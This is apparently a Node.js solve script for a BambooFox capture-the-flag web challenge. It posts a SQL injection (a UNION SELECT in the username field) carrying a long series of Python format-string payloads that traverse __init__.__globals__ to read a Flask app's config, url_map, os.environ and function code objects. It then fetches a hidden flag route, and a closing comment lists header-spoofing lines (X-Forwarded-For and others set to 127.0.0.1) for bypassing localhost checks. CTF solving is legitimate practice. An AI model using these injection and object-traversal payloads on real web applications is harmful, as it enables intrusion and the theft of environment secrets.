

const fetch = require('node-fetch')

const root = 'http://chall.ctf.bamboofox.tw:9527'
// const root = 'http://127.0.0.1:3000'

async function main() {
    const wrong = "2"
    const right = "w1MEoJZVmhu2u7GWN6V4SJRTUrLQxDJK9MBCWezdtOo"
    let payload = ""
    payload = "{0.__init__.__globals__}"
    payload = "{0.__init__.__globals__[get_flag]}"
    payload = "{0.__init__.__globals__}"
    payload = "{0.__init__.__globals__[get_flag].__dict__}"
    payload = "{0.__init__.__globals__[app].__dict__}"
    payload = "{0.__init__.__globals__[app].config}"
    payload = "{0.__init__.__globals__[app].view_functions}"
    payload = "{0.__init__.__globals__[app].url_map}"
    // payload = "{0.__init__.__globals__[app].url_map['/hey_guys_this_is_the_flag_route']}"
    payload = "{0.__init__.__globals__[app].url_map.converters}"
    payload = "{0.__init__.__globals__[getenv]}"
    payload = "{0.__init__.__globals__[getenv].__dict__}"
    payload = "{0.__init__.__globals__[session]}"
    payload = "{0.__init__.__globals__[session].__dict__}"
    payload = "{0.__init__.__globals__[app].logger.__dict__}"
    payload = "{0.__init__.__globals__[app].logger.__dict__}"
    payload = "{0.__init__.__globals__[request]}"
    payload = "{0.__init__.__globals__[request].__dict__}"
    payload = "{0.__init__.__globals__[get_flag].__str__}"
    payload = "{0.__init__.__globals__[get_flag].__doc__}"
    payload = "{0.__init__.__globals__[get_flag]}"
    payload = "{0.__init__.__globals__[User].__dict__}"
    payload = "{0.__init__.__globals__[User]}"
    payload = "{0.__class__.__base__.__subclasses__}"
    payload = "{0.__init__.__globals__[app].view_functions[get_flag]}"
    payload = "{0.__init__.__globals__[app].view_functions[get_flag].__dict__}"
    payload = "{0.__init__.__globals__[app].view_functions[get_flag].__dir__}"
    payload = "{0.__init__.__globals__[app].view_functions[get_flag].__call__}"
    payload = "{0.__init__.__globals__[getenv].__dict__}"
    payload = "{0.__init__.__globals__[app]}"
    payload = "{0.__init__.__globals__[request].url_rule.__dict__}"
    payload = "{0.__init__.__globals__[app].url_map.__class__.__dict__}"
    payload = "{0.__init__.__globals__[app].url_map.__repr__}"
    // payload = "{0.__init__.__globals__[__builtins__][os]}"
    payload = "{0.__init__.__globals__[__loader__].__dict__}"
    payload = "{0.__init__.__globals__[__cached__]}"
    payload = "{0.__init__.__globals__[secrets].__dict__}"
    payload = "{0.__init__.__globals__[secrets].os}"
    payload = "{0.__init__.__globals__[secrets].os.__dict__}"
    payload = "{0.__init__.__globals__[secrets].os.environ}"
    payload = "{0.__init__.__globals__[secrets].os.environ.__class__}"
    payload = "{0.__init__.__globals__[secrets].os.environ._data}"
    payload = "{0.__init__.__globals__[get_flag].__repr__}"
    payload = "{0.__init__.__globals__[User].__weakref__}"
    payload = "{0.__init__.__globals__[secrets].os.open('ls')}"
    payload = "{0.__init__.__globals__[secrets].os.sys.last_value}"
    payload = "{0.__init__.__globals__[secrets].os.sys.stdout.__dict__}"
    payload = "{0.__init__.__globals__[secrets].os.sys.__stdout__}"
    payload = "{0.__init__.__globals__[secrets].os.sys.stderr.__dict__}"
    payload = "{0.__init__.__globals__[secrets].os.sys.flask}"
    payload = "{0.__init__.__globals__[secrets].os.sys.modules.flask}"
    payload = "{0.__init__.__globals__[app].cli.__dict__}"
    payload = "{0.__init__.__globals__[app].config}"
    payload = "{0.__init__.__globals__[app].url_map.__dict__}"
    payload = "{0.__init__.__globals__[app].url_map.__dict__}"
    payload = "{0.__init__.__globals__[app].url_map._rules}"
    payload = "{0.__init__.__globals__[app].url_map._rules[0].__dict__}"
    payload = "{0.__init__.__globals__[app].url_map._rules[2].__dict__}"
    payload = "{0.__init__.__globals__[app].url_map._rules[0].arguments}"
    payload = "{0.__dict__}"
    payload = "{0.username}"
    payload = "{0.ip}"
    payload = "{0.__class__}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_argcount}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_consts}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_nlocals}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_code}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_consts}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_names}"
    payload = "{0.__init__.__globals__[get_flag].__code__.co_varnames}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.co_firstlineno}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"
    // payload = "{0.__init__.__globals__[get_flag].__code__.}"

    let formData = null;

    formData = new URLSearchParams()
    formData.append('username', `' UNION SELECT "${payload}" AS username, "1" AS password --`);
    formData.append('password', '');

    let res = await fetch(`${root}/login`, {
        method: 'POST',
        body: formData,
    })
    console.log(await res.text())
    console.log('----')

    res = await fetch(`${root}/hey_guys_this_is_the_flag_route`, {
        method: 'GET',
    })
    console.log(await res.text())
    // res = await fetch(`${root}/flag?token=${token}`)
    // console.log(await res.text())



}

main()

/*
REMOTE_ADDR: 127.0.0.1
X-Client-Ip: 127.0.0.1
Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Client-IP: 127.0.0.1
X-remote-IP: 127.0.0.1
X-remote-addr: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
Referer: 127.0.0.1
*/